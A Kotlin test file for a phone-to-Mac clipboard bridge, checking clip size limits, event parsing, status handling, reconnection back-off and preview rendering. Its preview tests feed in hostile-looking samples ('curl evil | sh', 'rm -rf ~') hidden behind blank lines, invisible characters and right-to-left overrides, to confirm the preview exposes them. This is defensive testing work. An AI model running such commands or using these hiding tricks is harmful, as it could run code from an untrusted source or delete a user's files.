package net.oxog.phonebox.deskpanel

import java.io.ByteArrayInputStream
import java.util.concurrent.CopyOnWriteArrayList
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

// JVM checks for the phone bridge's pure parts (BridgeClip.kt) and for what AgentStream does for the bridge: its path,
// read timeout, back-off, refusal delay, Last-Event-ID on reconnect and the Wi-Fi rotation switch.
// Run with: python3 tools/test-bridge-checks.py

private var passed = 0
private fun check(name: String, ok: Boolean) {
    if (!ok) throw AssertionError("FAIL: $name")
    passed++
    println("PASS: $name")
}

private fun shouldSendChecks() {
    check("null text is not sent", !BridgeClip.shouldSend(null, false))
    check("blank text is not sent", !BridgeClip.shouldSend("   \n", false))
    check("empty text is not sent", !BridgeClip.shouldSend("", false))
    check("a sensitive clip is not sent", !BridgeClip.shouldSend("hunter2", true))
    check("ordinary text is sent", BridgeClip.shouldSend("hello", false))
    check("exactly 64 KiB of ASCII is sent", BridgeClip.shouldSend("a".repeat(BridgeClip.MAX_BYTES), false))
    check("one byte over 64 KiB is not sent", !BridgeClip.shouldSend("a".repeat(BridgeClip.MAX_BYTES + 1), false))
    // the limit counts UTF-8 bytes: 40 000 Greek letters are 80 000 bytes, 32 768 of them are exactly 64 KiB
    check("40 000 Greek letters are over the limit", !BridgeClip.shouldSend("λ".repeat(40_000), false))
    check("32 768 Greek letters are exactly the limit", BridgeClip.shouldSend("λ".repeat(BridgeClip.MAX_BYTES / 2), false))
    check("16 385 emoji are over the limit", !BridgeClip.shouldSend("🌍".repeat(BridgeClip.MAX_BYTES / 4 + 1), false))
}

private fun parseEventChecks() {
    check("a clipboard event gives its text", BridgeClip.parseEvent("clipboard", """{"seq":3,"text":"hello"}""") == "hello")
    check("escaped newlines come back as newlines", BridgeClip.parseEvent("clipboard", """{"seq":3,"text":"a\nb\r\nc\td"}""") == "a\nb\r\nc\td")
    check("escaped quotes and backslashes", BridgeClip.parseEvent("clipboard", """{"seq":1,"text":"say \"hi\" C:\\dir"}""") == "say \"hi\" C:\\dir")
    check("a surrogate pair becomes one emoji", BridgeClip.parseEvent("clipboard", """{"seq":1,"text":"\ud83c\udf0d"}""") == "🌍")
    check("Greek by \\u escapes", BridgeClip.parseEvent("clipboard", """{"seq":1,"text":"\u039a\u03b1\u03bb\u03b7"}""") == "Καλη")
    check("raw non-ASCII passes through", BridgeClip.parseEvent("clipboard", "{\"seq\":1,\"text\":\"Καλημέρα ✓\"}") == "Καλημέρα ✓")
    check("a key named text inside the text is not mistaken for the field",
        BridgeClip.parseEvent("clipboard", """{"seq":2,"text":"{\"text\":\"evil\"}"}""") == """{"text":"evil"}""")
    check("another event name gives null", BridgeClip.parseEvent("state", """{"seq":3,"text":"hello"}""") == null)
    check("an event without text gives null", BridgeClip.parseEvent("clipboard", """{"seq":3}""") == null)
    check("a non-string text gives null", BridgeClip.parseEvent("clipboard", """{"seq":3,"text":5}""") == null)
    check("an empty text gives null", BridgeClip.parseEvent("clipboard", """{"seq":3,"text":""}""") == null)
    check("broken JSON gives null", BridgeClip.parseEvent("clipboard", """{"seq":3,"text":"unterminated""") == null)
    check("an array gives null", BridgeClip.parseEvent("clipboard", """["text"]""") == null)
}

private fun requestBodyChecks() {
    val samples = listOf("plain", "say \"hi\"", "back\\slash", "line1\nline2\r\n", "tab\there", "\u0001control\u001f", "Καλημέρα 🌍 ✓", "{\"text\":\"x\"}", "</script>")
    for (s in samples) {
        val body = BridgeClip.requestBody(s)
        check("body for ${s.take(12).replace("\n", "\\n")} is one JSON object with the text", body.startsWith("{\"text\":\"") && body.endsWith("\"}"))
        check("body round-trips ${s.take(12).replace("\n", "\\n")}", BridgeClip.parseEvent("clipboard", body) == s)
        check("body has no raw newline or control byte", body.none { it < ' ' })
    }
}

private fun skipReasonChecks() {
    check("null is skipped as nothing", BridgeClip.skipReason(null, false) == BridgeClip.Skip.NOTHING)
    check("blank is skipped as nothing", BridgeClip.skipReason(" \n ", false) == BridgeClip.Skip.NOTHING)
    check("sensitive is skipped as nothing (private)", BridgeClip.skipReason("hunter2", true) == BridgeClip.Skip.NOTHING)
    check("over the limit is skipped as too large", BridgeClip.skipReason("a".repeat(BridgeClip.MAX_BYTES + 1), false) == BridgeClip.Skip.TOO_LARGE)
    check("a long sensitive clip is private, not too large", BridgeClip.skipReason("a".repeat(BridgeClip.MAX_BYTES + 1), true) == BridgeClip.Skip.NOTHING)
    check("ordinary text has no skip reason", BridgeClip.skipReason("ok", false) == null)
    for (t in listOf<String?>(null, "", " ", "x", "a".repeat(BridgeClip.MAX_BYTES), "a".repeat(BridgeClip.MAX_BYTES + 1)))
        for (sensitive in listOf(false, true))
            check("shouldSend agrees with skipReason for ${t?.length} / $sensitive", BridgeClip.shouldSend(t, sensitive) == (BridgeClip.skipReason(t, sensitive) == null))
}

private fun resultChecks() {
    check("200 is OK", BridgeClip.resultFor(200) == SendResult.OK)
    check("403 means the Mac's switch is off", BridgeClip.resultFor(403) == SendResult.OFF)
    check("413 means too large", BridgeClip.resultFor(413) == SendResult.TOO_LARGE)
    check("503 (the link's offline reply) is unreachable", BridgeClip.resultFor(503) == SendResult.UNREACHABLE)
    check("500 is unreachable", BridgeClip.resultFor(500) == SendResult.UNREACHABLE)
    check("501 (not a Mac) is unreachable", BridgeClip.resultFor(501) == SendResult.UNREACHABLE)
    check("400 is unreachable", BridgeClip.resultFor(400) == SendResult.UNREACHABLE)
    // the link answers 504 when the POST went out and its reply was lost: the text may be on the Mac, so it is not a failure
    check("504 (sent, no answer) is unknown, not unreachable", BridgeClip.resultFor(504) == SendResult.UNKNOWN)
    check("401 (a key the Mac no longer accepts) asks to pair again", BridgeClip.resultFor(401) == SendResult.PAIR_AGAIN)
}

private fun previewChecks() {
    fun shown(text: String, max: Int = BridgeClip.PREVIEW_CHARS) = BridgeClip.preview(text, max).shown
    check("a short text is shown whole", shown("curl x | sh") == "curl x | sh")
    check("a short text hides nothing", BridgeClip.preview("curl x | sh").moreChars == 0)
    check("a text of exactly the limit is shown whole", shown("a".repeat(BridgeClip.PREVIEW_CHARS)) == "a".repeat(BridgeClip.PREVIEW_CHARS))
    val long = BridgeClip.preview("a".repeat(5000))
    check("a long text is cut to the limit with an ellipsis", long.shown == "a".repeat(BridgeClip.PREVIEW_CHARS) + "…")
    check("a cut says how many characters are not shown", long.moreChars == 5000 - BridgeClip.PREVIEW_CHARS)
    check("a cut in one line says one line", long.moreLines == 1)
    // the emoji's two halves sit at index 9 and 10: a cut at 10 must not keep only the first half
    val cut = BridgeClip.preview("a".repeat(9) + "🌍" + "b".repeat(20), 10)
    check("a cut never splits an emoji", cut.shown == "a".repeat(9) + "…" && cut.shown.none { Character.isSurrogate(it) })
    check("a cut keeps a whole emoji before the limit", shown("a".repeat(8) + "🌍" + "b".repeat(20), 10) == "a".repeat(8) + "🌍…")
    // what a sender can do to push the real command out of view: blank lines, spaces, tabs, invisible characters
    val newlines = BridgeClip.preview("\n".repeat(600) + "curl evil | sh")
    check("600 leading newlines do not push the command out of the preview", newlines.shown == "curl evil | sh" && newlines.moreChars == 0)
    check("blank lines between lines become one line break", shown("a\n\n\n\n  \n\t\nb") == "a\nb")
    check("runs of spaces and tabs become one space", shown("a \t  \u00A0\u2003 b") == "a b")
    check("Windows and old Mac line ends are one line break each", shown("a\r\nb\rc") == "a\nb\nc")
    check("leading and trailing whitespace is dropped", shown("  \n\t x \n\n") == "x")
    check("invisible characters do not pad the preview", shown("\u200B".repeat(900) + "curl evil | sh") == "curl evil | sh")
    check("blank-looking letters (Hangul filler, braille blank) do not pad the preview", shown("\u3164\u2800\uFFA0".repeat(300) + "curl evil | sh") == "curl evil | sh")
    check("a right-to-left override is not kept to reorder the text", shown("ls \u202Edc") == "ls dc")
    val padded = BridgeClip.preview("x".repeat(900) + "\ncurl evil | sh\nrm -rf ~")
    check("a harmless start does not hide that there is more: the rest is counted",
        padded.moreChars == 300 + "\ncurl evil | sh\nrm -rf ~".length && padded.moreLines == 3)
    check("the count is of lines with something in them", BridgeClip.preview("a".repeat(700) + "\n\n\nb\n\nc").moreLines == 3)
}

/** A stand-in for the production AgentLink (tools/kotlin-tests/AgentLink.kt): a code and a body per attempt. */
private fun streamPathChecks() {
    val closed = CountDownLatch(1)
    val link = AgentLink { ByteArrayInputStream(byteArrayOf()) }
    val stream = AgentStream(link, "/api/bridge/stream") { event, _ -> if (event == "close") closed.countDown() }
    stream.start()
    check("the stream opens and closes", closed.await(5, TimeUnit.SECONDS))
    stream.stop()
    check("the stream asked for the path it was given", link.paths.first() == "/api/bridge/stream")
}

private fun defaultPathCheck() {
    val closed = CountDownLatch(1)
    val link = AgentLink { ByteArrayInputStream(byteArrayOf()) }
    val stream = AgentStream(link) { event, _ -> if (event == "close") closed.countDown() }
    stream.start()
    check("the default stream still opens", closed.await(5, TimeUnit.SECONDS))
    stream.stop()
    check("the default path is the panel's stream", link.paths.first() == "/api/stream")
}

private fun stateChecks() {
    check("a refused (403) attempt means the Mac's switch is off", BridgeClip.stateAfterFailure(403) == ClipboardState.MAC_OFF)
    check("501 means this computer has no bridge", BridgeClip.stateAfterFailure(501) == ClipboardState.UNSUPPORTED)
    check("404 (an older agent) means this computer has no bridge", BridgeClip.stateAfterFailure(404) == ClipboardState.UNSUPPORTED)
    check("no route means waiting for the Mac", BridgeClip.stateAfterFailure(null) == ClipboardState.WAITING)
    check("401 (the Mac was paired again, the key is no longer valid) asks to pair again", BridgeClip.stateAfterFailure(401) == ClipboardState.PAIR_AGAIN)
    check("503 means waiting", BridgeClip.stateAfterFailure(503) == ClipboardState.WAITING)
    check("a later 'no route' replaces an earlier 403 (the state follows the latest failure)",
        listOf(403, null).fold(ClipboardState.STOPPED) { _, code -> BridgeClip.stateAfterFailure(code) } == ClipboardState.WAITING)
}

private fun readTimeoutChecks() {
    // the bridge stream carries only a ping every 15 s, so it must not be cut by the panel stream's 8 s read timeout
    val bridgeLink = AgentLink { ByteArrayInputStream(byteArrayOf()) }
    val closed = CountDownLatch(1)
    val bridge = AgentStream(bridgeLink, "/api/bridge/stream", readTimeoutMs = 40_000) { event, _ -> if (event == "close") closed.countDown() }
    bridge.start()
    check("the bridge stream opens", closed.await(5, TimeUnit.SECONDS))
    bridge.stop()
    check("the bridge stream asked for a 40 s read timeout", bridgeLink.timeouts.first() == 40_000)

    val panelLink = AgentLink { ByteArrayInputStream(byteArrayOf()) }
    val panelClosed = CountDownLatch(1)
    val panel = AgentStream(panelLink) { event, _ -> if (event == "close") panelClosed.countDown() }
    panel.start()
    check("the panel stream opens", panelClosed.await(5, TimeUnit.SECONDS))
    panel.stop()
    check("the panel stream keeps the 8 s read timeout", panelLink.timeouts.first() == AgentLink.STREAM_READ_TIMEOUT)
}

private fun refusedDelayChecks() {
    // while the Mac answers 403 the stream waits refusedRetryMs, not the 2 s of an ordinary failure
    val times = CopyOnWriteArrayList<Long>()
    val second = CountDownLatch(2)
    val link = AgentLink(code = { times.add(System.nanoTime()); second.countDown(); 403 }) { ByteArrayInputStream(byteArrayOf()) }
    val stream = AgentStream(link, "/api/bridge/stream", refusedRetryMs = 400) { _, _ -> }
    stream.start()
    check("two attempts were made while refused", second.await(5, TimeUnit.SECONDS))
    stream.stop()
    val gapMs = (times[1] - times[0]) / 1_000_000
    check("the retry after a 403 waited about refusedRetryMs ($gapMs ms)", gapMs in 350..1500)
}

private fun onFailureChecks() {
    // every failed attempt is reported with the status the agent answered, or null when it could not be reached
    fun collect(code: () -> Int, offline: () -> Boolean): List<Int?> {
        val seen = CopyOnWriteArrayList<Int?>()
        val three = CountDownLatch(3)
        val link = AgentLink(code = code, offline = offline) { ByteArrayInputStream(byteArrayOf()) }
        val stream = AgentStream(link, "/api/bridge/stream", retryMinMs = 20, retryMaxMs = 20, refusedRetryMs = 20,
            onFailure = { seen.add(it); three.countDown() }) { _, _ -> }
        stream.start()
        three.await(5, TimeUnit.SECONDS)
        stream.stop()
        return seen.take(3)
    }
    check("403 is reported as 403", collect({ 403 }, { false }) == listOf(403, 403, 403))
    check("501 (not a Mac) is reported as 501", collect({ 501 }, { false }) == listOf(501, 501, 501))
    check("no route is reported as null", collect({ 200 }, { true }) == listOf(null, null, null))
}

private fun onFailureStopChecks() {
    // stop() must wait for a failure report already running, so none lands after it returns (the clipboard service sets
    // its state to STOPPED right after stop(): a late report would put a stale "waiting" or "Mac off" over it)
    val entered = CountDownLatch(1)
    val finished = java.util.concurrent.atomic.AtomicBoolean(false)
    val reports = java.util.concurrent.atomic.AtomicInteger()
    val link = AgentLink(code = { 503 }) { ByteArrayInputStream(byteArrayOf()) }
    val stream = AgentStream(link, "/api/bridge/stream", retryMinMs = 20, retryMaxMs = 20, onFailure = {
        if (reports.getAndIncrement() == 0) { entered.countDown(); Thread.sleep(300); finished.set(true) }
    }) { _, _ -> }
    stream.start()
    check("a failure is reported", entered.await(5, TimeUnit.SECONDS))
    stream.stop()
    check("stop() returned only after the report in flight had finished", finished.get())
    val after = reports.get()
    Thread.sleep(200)
    check("no failure is reported after stop() returned", reports.get() == after)
}

private fun backoffChecks() {
    // failures wait 100, 200, 400, 400 ms (doubling to the cap), not a fixed delay
    val times = CopyOnWriteArrayList<Long>()
    val five = CountDownLatch(5)
    val link = AgentLink(code = { times.add(System.nanoTime()); five.countDown(); 503 }) { ByteArrayInputStream(byteArrayOf()) }
    val stream = AgentStream(link, "/api/bridge/stream", retryMinMs = 100, retryMaxMs = 400) { _, _ -> }
    stream.start()
    check("five attempts were made", five.await(10, TimeUnit.SECONDS))
    stream.stop()
    val gaps = (1..4).map { (times[it] - times[it - 1]) / 1_000_000 }
    check("the second wait is longer than the first ($gaps)", gaps[1] >= gaps[0] + 60)
    check("the waits stop growing at the cap ($gaps)", gaps[3] < gaps[2] + 250 && gaps[3] in 300..1500)
}

private fun backoffResetChecks() {
    // an attempt that connects starts the waits over: after 503, 503, an open stream, the next failure waits the minimum again
    val times = CopyOnWriteArrayList<Long>()
    val sequence = listOf(503, 503, 200, 503, 503)
    val five = CountDownLatch(5)
    val link = AgentLink(code = { times.add(System.nanoTime()); five.countDown(); sequence.getOrElse(times.size - 1) { 503 } }) { ByteArrayInputStream(byteArrayOf()) }
    val stream = AgentStream(link, "/api/bridge/stream", retryMinMs = 100, retryMaxMs = 800) { _, _ -> }
    stream.start()
    check("five attempts were made around an open stream", five.await(10, TimeUnit.SECONDS))
    stream.stop()
    val afterReset = (times[4] - times[3]) / 1_000_000
    check("the wait after a good connection is the minimum again ($afterReset ms)", afterReset in 60..300)
}

private fun refusedDefaultDelayCheck() {
    // with the default delay a 403 on the panel's own stream retries as before (2 s)
    val times = CopyOnWriteArrayList<Long>()
    val second = CountDownLatch(2)
    val link = AgentLink(code = { times.add(System.nanoTime()); second.countDown(); 403 }) { ByteArrayInputStream(byteArrayOf()) }
    val stream = AgentStream(link) { _, _ -> }
    stream.start()
    check("two attempts with the default delay", second.await(8, TimeUnit.SECONDS))
    stream.stop()
    val gapMs = (times[1] - times[0]) / 1_000_000
    check("the default retry is still about 2 s ($gapMs ms)", gapMs in 1800..3500)
}

private fun eventIdParseChecks() {
    check("id: 7 is 7", AgentStream.parseEventId("id: 7") == "7")
    check("id:12 (no space) is 12", AgentStream.parseEventId("id:12") == "12")
    check("a large seq is kept as text", AgentStream.parseEventId("id: 900719925474099") == "900719925474099")
    check("an empty id is ignored", AgentStream.parseEventId("id:") == null && AgentStream.parseEventId("id: ") == null)
    check("a non-decimal id is ignored", AgentStream.parseEventId("id: abc") == null && AgentStream.parseEventId("id: -1") == null && AgentStream.parseEventId("id: 0x10") == null)
    check("only one space is stripped (the SSE rule)", AgentStream.parseEventId("id:  5") == null)
    check("an id too long for a seq is ignored", AgentStream.parseEventId("id: " + "1".repeat(19)) == null)
    check("another field is not an id", AgentStream.parseEventId("data: 5") == null)
}

/** One body per attempt from [bodies]; then empty bodies. Waits until [attempts] connections were made. */
private fun headersFor(bodies: List<String>, attempts: Int, eventIds: AgentStream.EventIds?, seen: MutableList<String>? = null): List<Map<String, String>> {
    val calls = java.util.concurrent.atomic.AtomicInteger()
    val reached = CountDownLatch(attempts)
    val link = AgentLink { reached.countDown(); ByteArrayInputStream((bodies.getOrNull(calls.getAndIncrement()) ?: "").toByteArray()) }
    val stream = AgentStream(link, "/api/bridge/stream", eventIds = eventIds) { event, data -> if (event != "open" && event != "close") seen?.add("$event $data") }
    stream.start()
    check("$attempts connections were made", reached.await(8, TimeUnit.SECONDS))
    stream.stop()
    return link.headers.take(attempts)
}

private fun lastEventIdChecks() {
    val ids = AgentStream.EventIds()
    val seen = CopyOnWriteArrayList<String>()
    val first = "id: 7\nevent: clipboard\ndata: {\"seq\":7,\"text\":\"hi\"}\n\n"
    val headers = headersFor(listOf(first), 2, ids, seen)
    check("the first connection sends no Last-Event-ID (nothing received yet)", headers[0].isEmpty())
    check("the reconnect sends Last-Event-ID: 7", headers[1] == mapOf("Last-Event-ID" to "7"))
    check("the event with the id was still delivered", seen.firstOrNull() == "clipboard {\"seq\":7,\"text\":\"hi\"}")

    val latest = headersFor(listOf("id: 3\ndata: {}\n\nid: 9\ndata: {}\n\nid: x\ndata: {}\n\n"), 2, AgentStream.EventIds())
    check("the latest valid id is sent, a bad one does not replace it", latest[1] == mapOf("Last-Event-ID" to "9"))

    // a frame with only an id moves the id on; a frame cut by the connection (no blank line) does not, so the agent replays it
    val cut = headersFor(listOf("id: 4\n\nid: 5\nevent: clipboard\ndata: {\"seq\":5,\"text\":\"x\"}"), 2, AgentStream.EventIds())
    check("an id-only frame counts and a cut frame does not", cut[1] == mapOf("Last-Event-ID" to "4"))

    // the service builds a new stream on a pairing change or a reconnect from the screen: the same EventIds carries on
    val carried = headersFor(emptyList(), 1, ids)
    check("a replacement stream sends the id on its first connection", carried[0] == mapOf("Last-Event-ID" to "7"))

    val panel = headersFor(listOf(first), 2, null)
    check("the panel's stream never sends Last-Event-ID", panel.all { it.isEmpty() })
}

/** The id a stream keeps belongs to the computer it came from: USB can reach one Mac while Wi-Fi is paired with another. */
private fun idsPerComputerChecks() {
    val calls = java.util.concurrent.atomic.AtomicInteger()
    val order = listOf("A", "B", "A", "B")
    val bodies = listOf("id: 7\nevent: clipboard\ndata: {\"seq\":7,\"text\":\"a\"}\n\n", "id: 2\ndata: {}\n\n")
    val reached = CountDownLatch(order.size)
    val link = AgentLink(computer = { order[minOf(calls.get(), order.size - 1)] }) {
        reached.countDown(); ByteArrayInputStream((bodies.getOrNull(calls.getAndIncrement()) ?: "").toByteArray())
    }
    val stream = AgentStream(link, "/api/bridge/stream", eventIds = AgentStream.EventIds()) { _, _ -> }
    stream.start()
    check("four connections were made", reached.await(8, TimeUnit.SECONDS))
    stream.stop()
    val sent = link.headers.take(4)
    check("computer A's first connection sends nothing", sent[0].isEmpty())
    check("computer B does not get A's id", sent[1].isEmpty())
    check("back on A, A's own id is sent", sent[2] == mapOf("Last-Event-ID" to "7"))
    check("back on B, B's own id is sent", sent[3] == mapOf("Last-Event-ID" to "2"))
    val ids = AgentStream.EventIds()
    ids.set("A", "5"); ids.set("B", "6"); ids.clear()
    check("clearing forgets every computer's id", ids.get("A") == null && ids.get("B") == null)
}

/** What the screen's resume and the service's sync do: nothing at all for a phone that never used the bridge. */
private fun resumeAndSyncChecks() {
    check("a stream that is connected is left alone on resume", !BridgeClip.restartOnResume(true, ClipboardState.RUNNING))
    check("no stream at all starts one on resume", BridgeClip.restartOnResume(false, ClipboardState.STOPPED))
    check("a stream still connecting or backing off starts over on resume", BridgeClip.restartOnResume(true, ClipboardState.WAITING))
    check("the Mac's switch being off is not retried on every resume", !BridgeClip.restartOnResume(true, ClipboardState.MAC_OFF))
    check("pairing again is not retried on every resume", !BridgeClip.restartOnResume(true, ClipboardState.PAIR_AGAIN))
    check("an agent without the bridge is not retried on every resume", !BridgeClip.restartOnResume(true, ClipboardState.UNSUPPORTED))
    check("switch on starts the service", BridgeClip.syncAction(true, false) == BridgeClip.SyncAction.START)
    check("switch on again changes nothing but still starts (reconnects)", BridgeClip.syncAction(true, true) == BridgeClip.SyncAction.START)
    check("switch off after it was on cleans up", BridgeClip.syncAction(false, true) == BridgeClip.SyncAction.CLEAN_UP)
    check("switch off and never on: nothing at all", BridgeClip.syncAction(false, false) == BridgeClip.SyncAction.NOTHING)
}

/** A body that sends a small frame every 20 ms until it is closed (the panel's stream, or the bridge's pings). */
private fun endless(): java.io.InputStream = object : java.io.InputStream() {
    @Volatile var closed = false
    val frame = "data: {}\n\n".toByteArray()
    override fun read(): Int = throw IllegalStateException("bulk reads only")
    override fun read(b: ByteArray, off: Int, len: Int): Int {
        if (closed) return -1
        try { Thread.sleep(20) } catch (_: InterruptedException) { return -1 }
        if (closed) return -1
        val n = minOf(len, frame.size)
        System.arraycopy(frame, 0, b, off, n)
        return n
    }
    override fun close() { closed = true }
}

private fun rotationChecks() {
    check("the panel's Wi-Fi rotation stays at a minute", AgentStream.WIFI_ROTATE_MS == 60_000L)

    val rotating = AgentLink(route = { AgentLink.Route.WIFI }) { endless() }
    val second = CountDownLatch(1)
    val panel = AgentStream(rotating, wifiRotateMs = 200) { event, _ -> if (event == "close") second.countDown() }
    panel.start()
    check("a rotating stream drops its Wi-Fi connection", second.await(5, TimeUnit.SECONDS))
    Thread.sleep(500)
    panel.stop()
    check("and connects again", rotating.paths.size >= 2)

    val steady = AgentLink(route = { AgentLink.Route.WIFI }) { endless() }
    val closes = java.util.concurrent.atomic.AtomicInteger()
    val bridge = AgentStream(steady, "/api/bridge/stream", rotateOnWifi = false, wifiRotateMs = 200) { event, _ -> if (event == "close") closes.incrementAndGet() }
    bridge.start()
    Thread.sleep(1500)
    check("with rotation off the Wi-Fi stream stays open (${steady.paths.size} connections)", steady.paths.size == 1 && closes.get() == 0)
    bridge.stop()

    val usb = AgentLink(route = { AgentLink.Route.USB }) { endless() }
    val usbStream = AgentStream(usb, wifiRotateMs = 200) { _, _ -> }
    usbStream.start()
    Thread.sleep(1000)
    usbStream.stop()
    check("a USB stream is never rotated", usb.paths.size == 1)
}

fun main() {
    check("definitive USB refusals should allow Wi-Fi",
        BridgeClip.canFallBackFromUsb(403) && BridgeClip.canFallBackFromUsb(501))
    check("delivered, ambiguous or invalid clipboard writes must not be repeated",
        listOf(200, 409, 413, 500, 502, 504).none(BridgeClip::canFallBackFromUsb))

    shouldSendChecks()
    parseEventChecks()
    requestBodyChecks()
    skipReasonChecks()
    resultChecks()
    streamPathChecks()
    defaultPathCheck()
    stateChecks()
    readTimeoutChecks()
    refusedDelayChecks()
    onFailureChecks()
    onFailureStopChecks()
    backoffChecks()
    backoffResetChecks()
    refusedDefaultDelayCheck()
    previewChecks()
    idsPerComputerChecks()
    resumeAndSyncChecks()
    eventIdParseChecks()
    lastEventIdChecks()
    rotationChecks()
    println("ALL $passed CHECKS PASSED")
}
